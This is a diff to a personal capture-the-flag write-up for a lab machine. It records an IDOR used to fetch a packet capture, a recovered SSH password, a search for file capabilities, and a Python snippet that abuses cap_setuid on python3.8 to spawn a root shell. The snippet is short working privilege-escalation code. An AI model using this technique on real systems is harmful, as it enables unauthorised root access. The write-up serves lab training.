@@ -108,10 +108,43 @@ resolvinghowdataisthere.png
 feroxbusterwherewp.png
 noinjections.png
 
-### Todo 
+realised there are three pcaps then IDORed to 0th...
+nomoresighs.png
 
-Find credentials used somewhere in the 
-- Not the pcap
+
+bucketheadpassword.png
+Start playing [Soothsayer - Buckethead](https://www.youtube.com/watch?v=adV8-_hgL4ghttps://www.youtube.com/watch?v=adV8-_hgL4g), but then remembered killswitch mod and the hack sounding [Jordan](https://www.youtube.com/watch?v=Y-NjZp7Aurg) 
+
+`nathan : Buck3tH4TF0RM3!`
+
+wearenathan.png
+
+```bash
+Linux cap 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+# /nathan/snap contains: 
+lxd 
+# But linpeas or 
+getcap -r / 2>/dev/null
+# 
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+
+
+# root can ssh
+
+/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+
+handlers.py 
+```
+
+```python
+import os
+os.setuid(0)
+os.system("/bin/bash")
+```
+
+root.png
+
+### Todo 
 
 ### Done
 
